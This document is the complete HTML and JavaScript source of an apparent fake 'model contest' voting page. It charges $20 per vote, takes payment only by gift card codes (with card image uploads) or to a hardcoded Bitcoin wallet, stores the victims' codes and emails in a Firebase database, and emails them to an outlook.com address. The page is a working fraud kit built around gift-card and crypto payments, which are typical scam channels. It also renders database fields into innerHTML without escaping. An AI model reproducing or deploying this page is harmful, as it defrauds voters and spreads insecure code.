<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ZENITH 2026/2027</title>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:#0a0a0a;color:#fff;text-align:center}
h1{letter-spacing:4px;font-family:Georgia,serif;margin:20px 0 2px;font-size:28px}
.sub{font-size:10px;letter-spacing:3px;color:#777;margin-bottom:10px}
.season{display:inline-block;border:1px solid #333;padding:4px 10px;font-size:10px;letter-spacing:2px;color:#888;margin-bottom:14px}
.search{display:flex;max-width:420px;margin:10px auto;gap:8px;padding:0 12px}
.search input{flex:1;background:#111;border:1px solid #333;color:#fff;padding:13px}
.btn-gold{background:#c9a86a;color:#000;border:none;padding:13px 22px;font-weight:700;cursor:pointer}
.count{font-size:11px;color:#777;margin:12px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;max-width:1100px;margin:0 auto;padding:0 12px}
.card{background:#111;border:1px solid #222}
.card img{width:100%;height:220px;object-fit:cover;background:#222}
.card b{display:block;margin-top:8px;font-size:13px}
.card small.code{background:#1a1a1a;border:1px solid #333;padding:3px 8px;font-size:10px;color:#c9a86a;margin:6px auto;display:inline-block}
.votes{font-size:10px;color:#666;margin:4px}
.card .voteBtn{background:#c9a86a;color:#000;border:none;width:90%;margin:8px auto;padding:10px;font-weight:700;cursor:pointer;display:block}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.88);display:none;align-items:center;justify-content:center;z-index:50;padding:12px}
.mBox{background:#111;border:1px solid #333;max-width:400px;width:100%;padding:16px;text-align:left}
.mBox input,.mBox select{width:100%;padding:11px;background:#000;border:1px solid #333;color:#fff;margin:6px 0}
.wallet{background:#000;border:1px dashed #c9a86a;padding:8px;font-size:11px;word-break:break-all;text-align:center;margin:6px 0}
.tabs{display:flex;gap:6px;margin:8px 0}
.tabs button{flex:1;padding:9px;background:#222;color:#fff;border:1px solid #333;cursor:pointer}
.tabs button.active{background:#c9a86a;color:#000}
</style>
</head>
<body>
<h1>MODEL CONTEST 2026/2027</h1>
<div class="sub">PRIVATE VOTING - THE FACE OF ZENITH</div>
<div class="season">2026 / 2027 SEASON</div>

<div class="search">
<input id="codeInput" placeholder="" value="">
<button class="btn-gold" onclick="doSearch()">SEARCH</button>
</div>

<div class="count" id="count">Loading...</div>
<div class="grid" id="grid"></div>

<div class="modal" id="modal">
<div class="mBox">
<h3 id="mName" style="text-align:center"></h3>
<p style="text-align:center;font-size:11px;color:#888"><span id="mCode"></span> | <span id="mVotes"></span> VOTES</p>
<label style="font-size:10px;color:#888;margin-top:10px;display:block">Your Email</label>
<input id="vEmail" placeholder="">
<label style="font-size:10px;color:#888;display:block">Quantity - $20 per vote</label>
<input id="vQty" type="number" value="1" min="1" oninput="calc()">
<div style="font-size:12px">Total: $<span id="total">20</span></div>
<div class="tabs"><button id="tGift" class="active" onclick="setTab('gift')">Gift Card</button><button id="tBtc" onclick="setTab('btc')">BTC</button></div>
<div id="giftBox"><select id="gType"><option>Amazon</option><option>Apple</option><option>Steam</option><option>eBay</option><option>Vanilla</option><option>Other</option></select><input id="gCode" placeholder="Gift Card Code"><input id="gFile" type="file" accept="image/*"></div>
<div id="btcBox" style="display:none"><div class="wallet">bc1q4h7gjy978am0ntv9u7wj2erhw4vv0khsmsfun4</div><input id="bTxn" placeholder="BTC Txn ID"></div>
<button class="btn-gold" style="width:100%;margin-top:10px" onclick="pay()">PAY VIA EMAIL @ Zenithmodeling1@outlook.com</button>
<button style="width:100%;margin-top:8px;padding:10px;background:#222;color:#fff;border:1px solid #333" onclick="closeM()">CLOSE</button>
<p id="stat" style="font-size:11px;color:#c9a86a;text-align:center;margin-top:8px"></p>
</div>
</div>

<script>
var firebaseConfig={apiKey:"AIzaSyCah_ucdI55pyBR_RJ_ILu26aSALI1rVbA",authDomain:"zenith-2026-vote.firebaseapp.com",databaseURL:"https://zenith-2026-vote-default-rtdb.firebaseio.com",projectId:"zenith-2026-vote",storageBucket:"zenith-2026-vote.firebasestorage.app",messagingSenderId:"534661022606",appId:"1:534661022606:web:31af138277cf4e88ce9adf"};
firebase.initializeApp(firebaseConfig);
var db=firebase.database();
var models=[]; var sel=null; var tab='gift';

function calc(){ var q=parseInt(document.getElementById('vQty').value)||1; document.getElementById('total').textContent=q*20; }
window.setTab=function(t){ tab=t; document.getElementById('giftBox').style.display=t=='gift'?'block':'none'; document.getElementById('btcBox').style.display=t=='btc'?'block':'none'; document.getElementById('tGift').className=t=='gift'?'active':''; document.getElementById('tBtc').className=t=='btc'?'active':''; }

db.ref('models').on('value', function(snap){
 var data=snap.val();
 models=data?Object.keys(data).map(function(k){ var v=data[k]; v.id=k; return v; }):[];
 document.getElementById('count').textContent='All contestants - '+models.length+' models';
 var grid=document.getElementById('grid'); grid.innerHTML='';
 models.forEach(function(m){
  var d=document.createElement('div'); d.className='card';
  d.innerHTML='<img src="'+(m.mainImage||m.image)+'"><b>'+m.name+'</b><small class="code">'+m.code+'</small><div class="votes">☆ '+(m.votes||0)+' VOTES</div><button class="voteBtn" onclick="openM(\''+m.id+'\')">VOTE</button>';
  grid.appendChild(d);
 });
});

window.doSearch=function(){
 var q=document.getElementById('codeInput').value.trim().toLowerCase();
 if(!q){ 
  var snap=models; 
  document.getElementById('count').textContent='All contestants - '+snap.length+' models';
  var grid=document.getElementById('grid'); grid.innerHTML='';
  snap.forEach(function(m){
   var d=document.createElement('div'); d.className='card';
   d.innerHTML='<img src="'+(m.mainImage||m.image)+'"><b>'+m.name+'</b><small class="code">'+m.code+'</small><div class="votes">☆ '+(m.votes||0)+' VOTES</div><button class="voteBtn" onclick="openM(\''+m.id+'\')">VOTE</button>';
   grid.appendChild(d);
  });
  return;
 }
 var f=models.filter(function(m){ return m.code.toLowerCase().includes(q) || m.name.toLowerCase().includes(q); });
 var grid=document.getElementById('grid'); grid.innerHTML='';
 f.forEach(function(m){
  var d=document.createElement('div'); d.className='card';
  d.innerHTML='<img src="'+(m.mainImage||m.image)+'"><b>'+m.name+'</b><small class="code">'+m.code+'</small><div class="votes">☆ '+(m.votes||0)+' VOTES</div><button class="voteBtn" onclick="openM(\''+m.id+'\')">VOTE</button>';
  grid.appendChild(d);
 });
 document.getElementById('count').textContent='Found - '+f.length+' models';
};

window.openM=function(id){ sel=models.find(function(m){return m.id==id}); if(!sel) return; document.getElementById('mName').textContent=sel.name; document.getElementById('mCode').textContent=sel.code; document.getElementById('mVotes').textContent=sel.votes||0; document.getElementById('vQty').value=1; calc(); document.getElementById('modal').style.display='flex'; };
window.closeM=function(){ document.getElementById('modal').style.display='none'; document.getElementById('stat').textContent=''; };
window.pay=async function(){
 var email=document.getElementById('vEmail').value.trim();
 var qty=parseInt(document.getElementById('vQty').value)||1;
 var s=document.getElementById('stat');
 if(!email){s.textContent='Enter email'; return;}
 s.textContent='Saving...';
 try{
  var total=qty*20;
  var gType=document.getElementById('gType').value;
  var gCode=document.getElementById('gCode').value.trim();
  var bTxn=document.getElementById('bTxn').value.trim();
  await db.ref('votes').push({modelId:sel.id, contestantCode:sel.code, modelName:sel.name, voterEmail:email, qty:qty, total:total, payMode:tab, giftType:tab=='gift'?gType:'', giftCode:tab=='gift'?gCode:'', cryptoTxn:tab=='btc'?bTxn:'', wallet:'bc1q4h7gjy978am0ntv9u7wj2erhw4vv0khsmsfun4', created:Date.now()});
  await db.ref('models/'+sel.id).update({votes:(sel.votes||0)+qty});
  var subj=encodeURIComponent('Vote Payment - '+sel.code+' - '+qty+' votes');
  var body=encodeURIComponent('Model: '+sel.name+' ('+sel.code+')\nEmail: '+email+'\nQty: '+qty+' = $'+total+'\nPay: '+tab+'\nGift: '+gType+' '+gCode+'\nBTC: '+bTxn+'\nWallet: bc1q4h7gjy978am0ntv9u7wj2erhw4vv0khsmsfun4');
  window.location.href='mailto:Zenithmodeling1@outlook.com?subject='+subj+'&body='+body;
  s.textContent='✅ Saved! Opening email...';
  setTimeout(closeM,1200);
 }catch(e){s.textContent='Error '+e.message}
};
</script>
</body>
</html>
